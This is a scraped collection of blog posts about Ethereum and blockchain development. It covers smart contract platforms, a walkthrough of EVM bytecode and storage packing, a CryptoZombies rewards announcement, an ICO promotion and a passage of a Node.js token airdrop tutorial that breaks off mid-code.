cannot forget about platforms which are developing promising smart contract products. Let\u2019s take a look at our future options.Source: www.mentalfloss.comiOlite\u200a\u2014\u200aCreate Smart Contracts With Natural\u00a0LanguageiOlite is a product which focuses on the mass adoption of smart contract technology by providing an easy to use engine which is capable of understanding natural language to be compiled to smart contract code. iOlite is the ideal solution if you don\u2019t want to spend time learning, instead just start creating smart contracts.iOlite is based on the research done at Stanford University. They invented the FAE (Fast Adaptation Engine), which is capable of converting natural language or any other desired programming language into smart contract code. The FAE is not just straightaway translating your input to code. The FAE depends on contributors (smart contract experts) that are able to define structures containing language expressions. Furthermore, these structures are tied to smart contract code they write. This allows the engine to browse the structures to find the right expression so it can compile the desired smart contract. Whenever a structure is used, a contributor gets iOlite tokens rewarded.As you can see, iOlite relies on their community to make the FAE successful. The FAE helps them by applying Machine Learning techniques to help it learn and adopt new structures more easily.iOlite Labs is currently focusing on Ethereum smart contracts with Solidity as there is a massive need.Travis Byrne from the iOlite team explained which languages can be used to create smart contracts. \u201cWhat this means is that not only can programmers (in formal languages such as Python, C, JavaScript, etc.) immediately use their existing skills to write smart contracts, but also average people with no programming knowledge whatsoever, can just as easily start developing with natural languages like English. iOlite is dissolving the existing technical learning boundaries for creating smart contracts.\u201dSource: https://baseberry.com/smart-contract/Neblio\u200a\u2014\u200aBlockchain for\u00a0BusinessNeblio is targeting the integration of blockchain into pre-existing enterprises via easy to use APIs in eight of the most commonly used programming languages. The key goal of Neblio is to provide an easy to use blockchain for existing businesses. Developers should be able to use Neblio blockchain technology without being a blockchain expert.Neblio provides a Raspberry Pi wallet to stake your coins. The wallet itself can be set up with just one command after downloading the source code. By staking coins and running the node, you help to secure the wallet via a proof of work consensus algorithm and in return, you get a 10% increase on the amount of staked coins.Source: www.flickr.comThere is no obligation to run your Raspberry Pi day and night. Neblio allows you to have in total 7 days of downtime. Your coins will still gain weight during this time whilst your Raspberry Pi is off, however you won\u2019t be able to discover blocks (and therefore receive staking rewards). The wallet itself consumes very little energy which makes it a great incentive for holding your Neblio coins in order to have a more stable coin price. Source: Reddit.Probably you will ask yourself: How can your Raspberry Pi stay update to date as you can switch it off for so long? If you do this with an Ethereum node, you would have to sync for hours downloading the new data.Source: gifimage.netThis is why Neblio has come up with this cool featured called QuickSync which is capable of synchronizing your node in less than a minute. But how? A fresh copy of the Neblio blockchain is now uploaded every night at midnight to Github. The Raspberry Pi will by default download the blockchain data from Github on their first install or when you have switched off your node for a couple of days, extract it to your Neblio data directory, and then sync up the remaining few hours. This should result in near-instant syncing. Source: Reddit.What about Quick Sync security? The wallet will still verify all transactions. If there are any erroneous transactions, it won\u2019t sync up to the newest block. So, downloading the blockchain via Quick Sync is just as secure.Lisk\u200a\u2014\u200aSidechainsLisk is not in the smart contract business. Lisk intends to allow interfacing with smart contract systems, such as Ethereum, through virtual machine integration. Let me make this clear. Lisk is not a smart contract system, it is a custom blockchain system. Lisk has built their business model around creating a simplified user experience and platform to easily implement custom generated blockchains for anyone from the individual, to the small business, to large banks.Lisk runs every single application on a completely separate, isolated sidechain, responsible for itself. If a sidechain fails, the blame and responsibility falls squarely on the shoulders of the developer running the sidechain.Another great benefit of Lisk is its consensus algorithm. They use \u2018Delegate Proof of Stake\u2019, which is faster, more secure and consumes way less energy than Proof of Stake. You can learn more about it here.This final point is a contentious one and may be a matter of personal preference. Lisk is attempting to tap into the several hundred thousand strong JavaScript developer community by building their entire ecosystem in JavaScript. This makes it very easy for traditional web application developers to build out and interface with Lisk custom blockchains. There is zero need for them to learn a new language and JavaScript has been thoroughly tested and its issues well documented (JavaScript is far from perfect).Source: 3 ways Lisk isn\u2019t Ethereum and why it\u2019s a good thing\u200a\u2014\u200aMattewdcConclusionIt\u2019s hard to compare all platforms as it just depends on your needs. It\u2019s best to look at the maturity of each platform as that\u2019s a good indicator: SDK, build tools, proper documentation? iOlite is as well a good choice when you want to prototype smart contracts very fast. In my opinion, Stellar is a strong upcoming opponent in terms of low costs and a fast blockchain confirmation time.Featured ImageSource: https://cdn.gratisography.com/photos/435H.jpg", "responses": "22"}, {"title": "Diving Into The Ethereum Virtual\u00a0Machine", "author_name": "Howard", "link": "https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30?source=search_post", "post_date": "Aug 6, 2017", "readtime": "9 min read", "upvotes": "2.4K", "content": "Diving Into The Ethereum Virtual\u00a0MachineHowardBlockedUnblockFollowFollowingAug 6, 2017Solidity offers many high-level language abstractions, but these features make it hard to understand what\u2019s really going on when my program is running. Reading the Solidity documentation still left me confused over very basic things.What are the differences between string, bytes32, byte[], bytes?Which one do I use, when?What\u2019s happening when I cast a string to bytes? Can I cast to byte[]?How much do they cost?How are mappings stored by the EVM?Why can\u2019t I delete a mapping?Can I have mappings of mappings? (Yes, but how does that work?)Why is there storage mapping, but no memory mapping?How does a compiled contract look to the EVM?How is a contract created?What is a constructor, really?What is the fallback function?I think it\u2019s a good investment to learn how a high-level language like Solidity runs on the Ethereum VM (EVM). For couple of reasons.Solidity is not the last word. Better EVM languages are coming. (Pretty please?)The EVM is a database engine. To understand how smart contracts work in any EVM language, you have to understand how data is organized, stored, and manipulated.Know-how to be a contributor. The Ethereum toolchain is still very early. Knowing the EVM well would help you make awesome tools for yourself and others.Intellectual challenge. EVM gives you a good excuse to play at the intersection of cryptography, data structure, and programming language design.In a series of articles, I\u2019d like to deconstruct simple Solidity contracts in order to understand how it works as EVM bytecode.An outline of what I hope to learn and write about:The basics of EVM bytecode.How different types (mappings, arrays) are represented.What is going on when a new contract is created.What is going on when a method is called.How the ABI bridges different EVM languages.My final goal is to be able to understand a compiled Solidity contract in its entirety. Let\u2019s start by reading some basic EVM bytecode!This table of EVM Instruction Set would be a helpful reference.A Simple\u00a0ContractOur first contract has a constructor and a state variable:// c1.solpragma solidity ^0.4.11;contract C {    uint256 a;    function C() {      a = 1;    }}Compile this contract with solc:$ solc --bin --asm c1.sol======= c1.sol:C =======EVM assembly:    /* \"c1.sol\":26:94  contract C {... */  mstore(0x40, 0x60)    /* \"c1.sol\":59:92  function C() {... */  jumpi(tag_1, iszero(callvalue))  0x0  dup1  reverttag_1:tag_2:    /* \"c1.sol\":84:85  1 */  0x1    /* \"c1.sol\":80:81  a */  0x0    /* \"c1.sol\":80:85  a = 1 */  dup2  swap1  sstore  pop    /* \"c1.sol\":59:92  function C() {... */tag_3:    /* \"c1.sol\":26:94  contract C {... */tag_4:  dataSize(sub_0)  dup1  dataOffset(sub_0)  0x0  codecopy  0x0  returnstopsub_0: assembly {        /* \"c1.sol\":26:94  contract C {... */      mstore(0x40, 0x60)    tag_1:      0x0      dup1      revertauxdata: 0xa165627a7a72305820af3193f6fd31031a0e0d2de1ad2c27352b1ce081b4f3c92b5650ca4dd542bb770029}Binary:60606040523415600e57600080fd5b5b60016000819055505b5b60368060266000396000f30060606040525b600080fd00a165627a7a72305820af3193f6fd31031a0e0d2de1ad2c27352b1ce081b4f3c92b5650ca4dd542bb770029The number 6060604052... is bytecode that the EVM actually runs.In Baby\u00a0StepsHalf of the compiled assembly is boilerplate that\u2019s similar across most Solidity programs. We\u2019ll look at those later. For now, let\u2019s examine the unique part of our contract, the humble storage variable assignment:a = 1This assignment is represented by the bytecode 6001600081905550. Let\u2019s break it up into one instruction per line:60 0160 0081905550The EVM is basically a loop that execute each instruction from top to bottom. Let\u2019s annotate the assembly code (indented under the label tag_2) with the corresponding bytecode to better see how they are associated:tag_2:  // 60 01  0x1  // 60 00  0x0  // 81  dup2  // 90  swap1  // 55  sstore  // 50  popNote that 0x1 in the assembly code is actually a shorthand for push(0x1). This instruction pushes the number 1 onto the stack.It still hard to grok what\u2019s going on just staring at it. Don\u2019t worry though, it\u2019s simple to simulate the EVM line by line.Simulating The\u00a0EVMThe EVM is a stack machine. Instructions might use values on the stack as arguments, and push values onto the stack as results. Let\u2019s consider the operation add.Assume that there are two values on the stack:[1 2]When the EVM sees add, it adds the top 2 items together, and pushes the answer back onto the stack, resulting in:[3]In what follows, we\u2019ll notate the stack with []:// The empty stackstack: []// Stack with three items. The top item is 3. The bottom item is 1.stack: [3 2 1]And notate the contract storage with {}:// Nothing in storage.store: {}// The value 0x1 is stored at the position 0x0.store: { 0x0 => 0x1 }Let\u2019s now look at some real bytecode. We\u2019ll simulate the bytecode sequence 6001600081905550 as EVM would, and print out the machine state after each instruction:// 60 01: pushes 1 onto stack0x1  stack: [0x1]// 60 00: pushes 0 onto stack0x0  stack: [0x0 0x1]// 81: duplicate the second item on the stackdup2  stack: [0x1 0x0 0x1]// 90: swap the top two itemsswap1  stack: [0x0 0x1 0x1]// 55: store the value 0x1 at position 0x0// This instruction consumes the top 2 itemssstore  stack: [0x1]  store: { 0x0 => 0x1 }// 50: pop (throw away the top item)pop  stack: []  store: { 0x0 => 0x1 }The end. The stack is empty, and there\u2019s one item in storage.What\u2019s worth noting is that Solidity had decided to store the state variable uint256 a at the position 0x0. It's perfectly possible for other languages to choose to store the state variable elsewhere.In pseudocode, what the EVM does for 6001600081905550 is essentially:// a = 1sstore(0x0, 0x1)Looking carefully, you\u2019d see that the dup2, swap1, pop are superfluous. The assembly code could be simpler:0x10x0sstoreYou could try to simulate the above 3 instructions, and satisfy yourself that they indeed result in the same machine state:stack: []store: { 0x0 => 0x1 }Two Storage VariablesLet\u2019s add one extra storage variable of the same type:// c2.solpragma solidity ^0.4.11;contract C {    uint256 a;    uint256 b;    function C() {      a = 1;      b = 2;    }}Compile, focusing on tag_2:$ solc --bin --asm c2.sol// ... more stuff omittedtag_2:    /* \"c2.sol\":99:100  1 */  0x1    /* \"c2.sol\":95:96  a */  0x0    /* \"c2.sol\":95:100  a = 1 */  dup2  swap1  sstore  pop    /* \"c2.sol\":112:113  2 */  0x2    /* \"c2.sol\":108:109  b */  0x1    /* \"c2.sol\":108:113  b = 2 */  dup2  swap1  sstore  popThe assembly in pseudocode:// a = 1sstore(0x0, 0x1)// b = 2sstore(0x1, 0x2)What we learn here is that the two storage variables are positioned one after the other, with a in position 0x0 and b in position 0x1.Storage PackingEach slot storage can store 32 bytes. It\u2019d be wasteful to use all 32 bytes if a variable only needs 16 bytes. Solidity optimizes for storage efficiency by packing two smaller data types into one storage slot if possible.Let\u2019s change a and b so they are only 16 bytes each:pragma solidity ^0.4.11;contract C {    uint128 a;    uint128 b;    function C() {      a = 1;      b = 2;    }}Compile the contract:$ solc --bin --asm c3.solThe generated assembly is now more complex:tag_2:  // a = 1  0x1  0x0  dup1  0x100  exp  dup2  sload  dup2  0xffffffffffffffffffffffffffffffff  mul  not  and  swap1  dup4  0xffffffffffffffffffffffffffffffff  and  mul  or  swap1  sstore  pop  // b = 2  0x2  0x0  0x10  0x100  exp  dup2  sload  dup2  0xffffffffffffffffffffffffffffffff  mul  not  and  swap1  dup4  0xffffffffffffffffffffffffffffffff  and  mul  or  swap1  sstore  popThe above assembly code packs these two variables together in one storage position (0x0), like this:[         b         ][         a         ][16 bytes / 128 bits][16 bytes / 128 bits]The reason to pack is because the most expensive operations by far are storage usage:sstore costs 20000 gas for first write to a new position.sstore costs 5000 gas for subsequent writes to an existing position.sload costs 500 gas.Most instructions costs 3~10 gases.By using the same storage position, Solidity pays 5000 for the second store variable instead of 20000, saving us 15000 in gas.More OptimizationInstead of storing a and b with two separate sstore instructions, it should be possible to pack the two 128 bits numbers together in memory, then store them using just one sstore, saving an additional 5000 gas.You can ask Solidity to make this optimization by turning on the optimize flag:$ solc --bin --asm --optimize c3.solWhich produces assembly code that uses just one sload and one sstore:tag_2:    /* \"c3.sol\":95:96  a */  0x0    /* \"c3.sol\":95:100  a = 1 */  dup1  sload    /* \"c3.sol\":108:113  b = 2 */  0x200000000000000000000000000000000  not(sub(exp(0x2, 0x80), 0x1))    /* \"c3.sol\":95:100  a = 1 */  swap1  swap2  and    /* \"c3.sol\":99:100  1 */  0x1    /* \"c3.sol\":95:100  a = 1 */  or  sub(exp(0x2, 0x80), 0x1)    /* \"c3.sol\":108:113  b = 2 */  and  or  swap1  sstoreThe bytecode is:600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055And formatting the bytecode to one instruction per line:// push 0x060 00// dup180// sload54// push17 push the the next 17 bytes as a 32 bytes number70 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00/* not(sub(exp(0x2, 0x80), 0x1)) */// push 0x160 01// push 0x80 (32)60 80// push 0x80 (2)60 02// exp0a// sub03// not19// swap190// swap291// and16// push 0x160 01// or17/* sub(exp(0x2, 0x80), 0x1) */// push 0x160 01// push 0x8060 80// push 0x0260 02// exp0a// sub03// and16// or17// swap190// sstore55There are four magic values used in the assembly code:0x1 (16 bytes), using lower 16 bytes// Represented as 0x01 in bytecode16:32 0x0000000000000000000000000000000000:16 0x000000000000000000000000000000010x2 (16 bytes), using higher 16bytes// Represented as 0x200000000000000000000000000000000 in bytecode16:32 0x0000000000000000000000000000000200:16 0x00000000000000000000000000000000not(sub(exp(0x2, 0x80), 0x1))// Bitmask for the upper 16 bytes16:32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00:16 0x00000000000000000000000000000000sub(exp(0x2, 0x80), 0x1)// Bitmask for the lower 16 bytes16:32 0x00000000000000000000000000000000 00:16 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFThe code does some bits-shuffling with these values to arrive at the desired result:16:32 0x00000000000000000000000000000002 00:16 0x00000000000000000000000000000001Finally, this 32bytes value is stored at position 0x0.Gas Usage600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055Notice that 0x200000000000000000000000000000000 is embedded in the bytecode. But the compiler could\u2019ve also chosen to calculate the value with the instructions exp(0x2, 0x81), which results in shorter bytecode sequence.But it turns out that 0x200000000000000000000000000000000 is a cheaper than exp(0x2, 0x81). Let's look at the gas fees involved:4 gas paid for every zero byte of data or code for a transaction.68 gas for every non-zero byte of data or code for a transaction.Let\u2019s compare how much either representation costs in gas.The bytecode 0x200000000000000000000000000000000. It has many zeroes, which are cheap.(1 * 68) + (16 * 4) = 196.The bytecode 608160020a. Shorter, but no zeroes.5 * 68 = 340.The longer sequence with more zeroes is actually cheaper!SummaryAn EVM compiler doesn\u2019t exactly optimize for bytecode size or speed or memory efficiency. Instead, it optimizes for gas usage, which is an layer of indirection that incentivizes the sort of calculation that the Ethereum blockchain can do efficiently.We\u2019ve seen some quirky aspects of the EVM:EVM is a 256bit machine. It is most natural to manipulate data in chunks of 32 bytes.Persistent storage is quite expensive.The Solidity compiler makes interesting choices in order to minimize gas usage.Gas costs are set somewhat arbitrarily, and could well change in the future. As costs change, compilers would make different choices.", "responses": "10"}, {"title": "CryptoZombies has come to a fork in the road (+Surprise Rewards\u00a0\ud83c\udf89)", "author_name": "\ud83d\udc7d Dilanka @ LOOM", "link": "https://medium.com/loom-network/cryptozombies-has-come-to-a-fork-in-the-road-surprise-rewards-1a950f2c9d4e?source=search_post", "post_date": "Mar 22, 2018", "readtime": "6 min read", "upvotes": "2.1K", "content": "CryptoZombies has come to a fork in the road (+Surprise Rewards\u00a0\ud83c\udf89)\ud83d\udc7d Dilanka @ LOOMBlockedUnblockFollowFollowingMar 22, 2018Your Zombies are being prepared to journey into their own DAppChainIn just 6 months of launch, CryptoZombies has helped over 135,242+ developers master Solidity and Ethereum smart contracts.\u2026and now, it\u2019s time for your Zombies to evolve\u200a\u2014\u200aINTO Blockchain Zombies.That\u2019s right.We\u2019re hard forking CryptoZombies onto its own DAppChain.Since every evolution depends on change, I brought some exciting news JUST FOR YOU...As in, I am going to reveal some surprise rewards for being a loyal early adopter.That means YOU will now get the chance to earn some serious perks for your efforts on CryptoZombies.Please, contain your excitement for your own\u00a0safety.It\u2019s our way of saying \u201cThank You\u201d.But, you\u2019ll still have to do some work to earn it \ud83d\ude0eMatter of fact\u200a\u2014\u200aYou\u2019ll have until \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 @ 12:00:00 UTC to earn these insane perks, so be sure to read this entire post to find out how.Update: We\u2019ve postponed the deadline to April 20th at the same time to account for delays in translating Lesson 6. So you have an extra week to claim your rewards!Before we get to that\u2026First\u2026Long before the world was full of\u00a0Zombies\u2026When we originally started CryptoZombies late last year, there weren\u2019t many educational resources for upcoming blockchain developers.So we decided to take it upon ourselves to create a kick-ass, interactive \u201ccode school\u201d for learning Solidity and Ethereum Smart Contracts.The idea was simple: Get beginners to master Solidity development in a fun, interactive manner where they code their own zombie game.Since then, it has been such a hit that\u2026\u2026\u2026CryptoZombies is now the World\u2019s Most Trusted \u201ccode school\u201d for learning Solidity and Ethereum Smart Contracts.\u2026and it\u2019s about to get EVEN\u00a0BETTER.HOW\u2026you ask?We are HARD FORKING CryptoZombies.io onto it\u2019s own DAppChainAs you know, we already launched the world\u2019s FIRST DAppChain app called DelegateCall recently. *(What is a DAppChain?)DelegateCall is meant to be a fully operational implementation of our technology.DelegateCall is running smoothly on its own DAppChain because of the Loom SDK\u200a\u2014\u200awhich does all the heavy lifting for developers that are building the next generation of fully scalable DApps on dedicated DAppChains.In the future, we are expecting THOUSANDS of decentralized DApps to be running on Loom DAppChains.Until then, please help me welcome CryptoZombies.io as our second DAppChain App.Why Fork CryptoZombies.io?The reasons for hard forking CryptoZombies are threefold:It demonstrates that the Loom SDK can be used to store all sorts of data (like: game play states, character data, lesson progress, etc) on scalable DAppChains.Achievements will be verifiable on the blockchain, so students could literally \u201cprove\u201d their knowledge to anyone (including employers)We want to demonstrate a really cool feature of DAppChains: Inter-blockchain relay. When CryptoZombies is on its own DAppChain, you\u2019ll be able to import your lesson progress into DelegateCall, and have it show an indicator on your profile (as a badge) so that everyone knows your level of Solidity understanding.We don\u2019t want you to get kidnapped, So PLEASE Don\u2019t Tell Anyone about these\u00a0perks.That\u2019s right.If you are one of our loyal, hardworking, early adopter students (i.e: original gangsters)\u200a\u2014\u200ayou have the chance to earn some serious rewards and perks.You earned\u00a0it.The rewards and perks will be given in TWO separate tiers:Those who have finished SOME, but NOT all lessons on CryptoZombies by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 at 12:00:00 UTC.Those who HAVE finished ALL the lessons on CryptoZombies by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 at 12:00:00 UTC.So, WTF does that mean?1. Rewards for students who have finished SOME but NOT ALL the\u00a0lessonsIn other words, if you are an existing CryptoZombies student (and haven\u2019t finished all the lessons by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018), you will STILL (automatically) get the following rewards:1 x LOOM Token (Regular Loom Membership)10 x DelegateCall TokensRare item on Etherboy (our upcoming DAppChain Game)1 x card pack on Battleground (our upcoming DAppChain Game)Again, rewards will be automatically credited to your CryptoZombies account, you don\u2019t have to \u201cdo anything\u201d to get them.Plus\u200a\u2014\u200aMuch like Santa Claus, we KNOW if you\u2019ve actually finished the lessons or not \ud83d\ude09So, no cheating.But, if you are AMBITIOUS, you can\u2026.2. Finish ALL 6 LESSONS by the deadline and SUPERCHARGE your Perks\u00a0\ud83c\udf89Now, if you are super dedicated and have worked very hard to finish ALL 6 LESSONS on CryptoZombies, we want to acknowledge that.Let\u2019s take a moment to respect all the hustlers staying up all night studying Solidity on CryptoZombiesSome of you are drinking obscene amounts of caffeine and other questionable substances to trick your body into not sleeping so you could finish lessons on CryptoZombies.Kudos \ud83d\ude47We don\u2019t recommend putting your health at risk, but we do respect the hustle.\u2026and to show our respect, if you finish ALL 6 LESSONS of CryptoZombies by \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336April 20th 2018 (12:00:00 UTC), you\u2019ll be rewarded with additional perks.If you finish ALL 6 Lessons by the deadline, you\u2019ll be getting:10 x LOOM Tokens (Developer tier Loom Membership)100 x DelegateCall TokensLegendary genesis item on \u201cEtherboy in Blockchain World\u201d (Upcoming DAppChain Game)Special-edition card with your very own zombie (genetically cloned from your CryptoZombie\u2019s DNA) on \u201cCryptoZombies Battleground\u201d (Upcoming DAppChain Game)If you have finished ALL lessons are are just waiting for Lesson 6, RELAX\u200a\u2014\u200aCryptoZombies Lesson 6 will be out before the \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336April 20th Deadline.Remember, the reward cutoff date is \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336April 20th, 12:00:00 UTC\u200a\u2014\u200aand you MUST COMPLETE ALL 6 Lessons on CryptoZombies to qualify for the additional perks.TL;DR:We already released our first DAppChain App (called DelegateCall), and we are hard-forking the world-famous CryptoZombies.io into its own DAppChain.Rewards will be given to the most loyal and hardworking students of CryptoZombies (if they qualify). See details above on how to qualify. (Deadline for Rewards: \u0336A\u0336p\u0336r\u0336i\u0336l\u0336 \u03366\u0336t\u0336h\u0336 April 20th 2018 at 12:00:00 UTC)Once hard-forked, The CryptoZombies DAppChain will have inter-blockchain relay with the Delegatecall DAppChain. When CryptoZombies is on its own DAppChain, you\u2019ll be able to import your lesson progress into DelegateCall, and have it show an indicator on your profile (as a badge) so that everyone knows your level of Solidity understanding.Students who finished ALL CryptoZombies lessons will have a special badge on DelegateCall that proves their understanding of the blockchain.DelegateCall Job Board (Coming Soon) will show candidate status and relevant achievements automatically for employers looking to hire blockchain developers.The hard-fork also demonstrates that the Loom SDK can be used to build all sorts of applications (like: games, social networks, etc) on a fully scalable DAppChain to fuel the future decentralization of the Internet.Good luck! Cryptozombies are waiting.", "responses": "5"}, {"title": "Smart Contract Testing & Ethereum Simulator", "author_name": "Amazingandyyy", "link": "https://medium.com/etherereum-salon/eth-testing-472c2f73b4c3?source=search_post", "post_date": "Aug 4, 2017", "readtime": "7 min read", "upvotes": "962", "content": "Smart Contract Testing & Ethereum SimulatorAmazingandyyyBlockedUnblockFollowFollowingAug 4, 2017In my last tutorial, I show Solidity programming language a bit and what it feels like to develop a simple HelloWorld smart contract. Today, I am talking about testing which is an important topic in development, especially for the smart contract development.All codes in this tutorial are available in this repoamazingandyyy/the-good-ethereum-smart-contract-tutorialthe-good-ethereum-smart-contract-tutorial - Repo for The Complete Ethereum Smart Contract Development tutorials series.github.com", "responses": "17"}, {"title": "BOGDAN FIEDUR joins advisory board of\u00a0BiNeuro", "author_name": "BiNeuro", "link": "https://medium.com/@bineuro.ico/bogdan-fiedur-joins-advisory-board-of-bineuro-527537bc881f?source=search_post", "post_date": "Jun 26, 2018", "readtime": "", "upvotes": "1.5K", "content": "BOGDAN FIEDUR joins advisory board of\u00a0BiNeuroBogdan Fiedur\u200a\u2014\u200aTOP ICO Advisor. Full Stack and Ethereum/Solidity smart contract developerBiNeuroBlockedUnblockFollowFollowingJun 26, 2018Bogdan Fiedur about BiNeuro: \u201cBiNeuro is absolutely unique project in the digital advertising world. BiNeuro\u200a\u2014\u200aa synthesis of the Artificial Intelligence and Blockchain technology and it increase effectiveness of digital advertising campaigns by at least\u00a050%!\u201dBogdan Fiedur is a smart contract developer, crypto-investor, entrepreneur and President of Blockainexperts. He has over 20 years of IT experience and has been involved in blockchain development during last 3 years.https://www.youtube.com/watch?v=LIpzFoO3d8MDmitry Pavlov, mathematician, sustaining member of the New York Academy of Sciences and IEEE, founder of UCT World Corporation about BiNeuro product:\u201cIn 2017, UCT WORLD CORPORATION was nominated to TOP 10 of Google \u2018s fastest growing partners, owing to the BiNeuro system. BiNeuro is already working and is able to replace human with an AI based neural network that can learn and accumulate experience.\u201cFor more information \ud83d\udc49 Click\u00a0hereJoin BiNeuro Token Sale \ud83d\udc49 https://bineuro.com/web/Sign up Official Telegram BiNeuro Channel \ud83d\udc49 https://t.me/BiNeuroChannelDo you want to see BiNeuro in action? Welcome to the YouTube ICO Chart Channel! Click the \u201cLike\u201d button and subscribe to the channel! \ud83d\udc49https://www.youtube.com/channel/UC1AQ3O1md5ChAVK-fkE6cwg", "responses": ""}, {"title": "How To Script An Automatic Token Airdrop for 40k subscribers", "author_name": "Pablo Ruiz", "link": "https://hackernoon.com/how-to-script-an-automatic-token-airdrop-for-40k-subscribers-e40c8b1a02c6?source=search_post", "post_date": "Jan 28, 2018", "readtime": "12 min read", "upvotes": "683", "content": "Photo by Dose Media on\u00a0UnsplashHow To Script An Automatic Token Airdrop for 40k subscribersPablo RuizBlockedUnblockFollowFollowingJan 28, 2018I\u2019m happy to announce that I recently joined the Polymath team as a Solidity Engineer to spearhead the development of a new standard for blockchain-based securities tokens. \ud83c\udf86\ud83c\udf86\ud83c\udf86In this article/tutorial I\u2019m going to go over the process of writing a node.js script that performs an automatic token distribution/airdrop to a list of Ethereum addresses. I\u2019m going to use the code we wrote for the Polymath Token Distribution process\u200a\u2014\u200awhich is a pretty standard ERC20 token\u200a\u2014\u200aand go over the script I built to handle the automatic distribution of the tokens.Originally, I was planning on running this script through Infura so I didn\u2019t have to run a full-node locally. That required signing the transactions offline, which I was doing by using a couple of handy functions from the latest version of web3. Unfortunately, even though that worked like a charm on testrpc and on Ropsten, on Mainnet it was a disaster. Transactions were not getting picked up, it was extremely slow, costly and unreliable.\u00a0If you want to check it out anyways, you can refer to this early commit.The Token and Token Distribution contractsOne of my first tasks at Polymath was helping the team iron out the Token and Token Distribution smart contracts that we will use in the upcoming days to launch the POLY Token and perform the launch airdrop to the 40k of the people that subscribed to the platform.I\u2019m not going to go into much detail about the code of these contracts, but you can take a look at them as they have been made public on Polymath\u2019s Github Repository.Here\u2019s a few things that are worth mentioning about the PolyToken.sol and PolyDistribution.sol smart contracts, that will help make sense of the rest of the tutorial:PolyToken.sol is the contract for the POLY token. It\u2019s a pretty standard ERC20 token contract with a fixed supply.PolyDistribution.sol is the contract that will handle the initial distribution of the tokens. We separated the allocation of tokens for presale investors, advisors, founders, etc. from the airdrop as the process was meant to be very different. In our case, we are going to use 10 million tokens (from the 1 billion being issued) for the airdrop, giving away 250 tokens to 40,000 people. The most important function to look at for this tutorial is airdropTokens(), let\u2019s review it:function airdropTokens(address[] _recipient) public onlyOwnerOrAdmin {    require(now >= startTime);    uint airdropped;    for(uint i = 0; i< _recipient.length; i++)    {        if (!airdrops[_recipient[i]]) {          airdrops[_recipient[i]] = true;          require(POLY.transfer(_recipient[i], 250 * decimalFactor));          airdropped = airdropped.add(250 * decimalFactor);        }    }    AVAILABLE_AIRDROP_SUPPLY = AVAILABLE_AIRDROP_SUPPLY.sub(airdropped);    AVAILABLE_TOTAL_SUPPLY = AVAILABLE_TOTAL_SUPPLY.sub(airdropped);    grandTotalClaimed = grandTotalClaimed.add(airdropped);  }What airdropTokens() basically does is to distribute (calling ERC20\u2019s transfer() function) 250 POLY tokens\u200a\u2014\u200awhich are regular ERC20 tokens\u200a\u2014\u200ato an array of addresses. For each address we receive, we transfer 250 POLY to them as long as they haven\u2019t already received their allocation already. After the process finishes, we update the available supply and keep track of how many tokens have already been distributed.For this tutorial we\u2019ll only focus on distributing the tokens meant for airdrop recipients. As can be observed above, these tokens are allocated and transferred with no vesting or cliff periods. The case is not the same for the other type of allocations, those have some special conditions that need to be met before they can be transferred/sold.If you are interested in seeing how the rest of the allocations are done, you can review the setAllocation() and transferTokens() functions from PolyDistribution.sol\u00a0.The Token Distribution EventWhen the token distribution date arrives, what our team will need to do is to distribute the tokens to each account that signed up for the airdrop. That data has been collected over the past few months from the comapny\u2019s site and it contains the addresses of every account that signed up for the airdrop and that was successfully verified during the KYC verification process. The collected data we need for the airdrop process is stored in a CSV file that has just 1 column: The Ethereum address of each subscriber.Note that the script could be easily modified to contain not only the address of the subscriber but also how many tokens they should be transferred. In this case, since we decided to give 250 POLY to everyone, this was not necessary and we opted to hardcode that number in the distribution smart contract.Doing an airdrop, in theory, is quite simple. All we would need to do is to call the transfer() function of the ERC20 token for each address we collected.The above could be done by manually executing the transfer() function if we had just a handful of subscribers, but with potentially thousands of people that will want to get a hold of their tokens the moment it\u2019s launched, doing the above, one by one, would be very time consuming.Automating the Token Distribution Process Through a Node.js\u00a0Script.Having explained how the token and distribution contracts work, let\u2019s dive into the JS code. We need to do a few things in order to automate the token distribution process:We have to read the CSV file and process it to remove blank or invalid entries. We assume some of the data will be missing or some addresses might be erroneous, so we\u2019ll make sure to take those out before we send them to the blockchain.We\u2019ll pack the addresses in multiple arrays that contain 80 addresses each. Why 80? After several tests, that was the ideal number given the gas cost of transferring tokens. Depending on what you are trying to do with each entry, it might cost more or less gas per transaction, and you should pack entries accordingly so the transaction doesn\u2019t run out of gas and rolls back.Once we have our set of arrays we\u2019ll pass each of them to the airdropTokens() function on the smart contract which will loop through the array and call the transfer() method for each subscriber to send them their tokens.Afterwards, we\u2019ll run another process to get all the Transfer events generated by the distribution contract so we can review that the distributions went well. (We\u2019ll sum the tokens distributed, which should match the data we had on file).Let\u2019s start by setting the project up:If you want to skip the whole tutorial and just run the script, you can find the full source code here.Set upRun the commands below to set up a brand new project and install the required dependencies:$ mkdir distributionTutorial$ npm init$ truffle init$ npm install web3 fast-csv truffle-contract ethereumjs-testrpc  --saveFor this project we will be using a few libraries and frameworks:Truffle: Which allows us to easily compile, migrate and interact with our contracts from JavaScript.Fast-csv: To read and process the data form a CSV file.You should also install Parity and sync it on Ropsten (or whichever testnet / mainnet you prefer). The following command has worked for me pretty well:parity \u2014 chain ropsten \u2014 rpcapi \u201ceth,net,web3,personal,parity\u201d \u2014 unlock <THE ACCOUNT YOU WANT TO UNLOCK> \u2014 password $HOME/password.fileNext, copy the Polymath Distribution smart contracts to the contracts folder of your project. The files can be found here: https://github.com/PolymathNetwork/polymath-token-distribution/tree/master/contractsOpen truffle.js and replace its content with the following code:module.exports = {  networks: {   development: {      host: 'localhost',      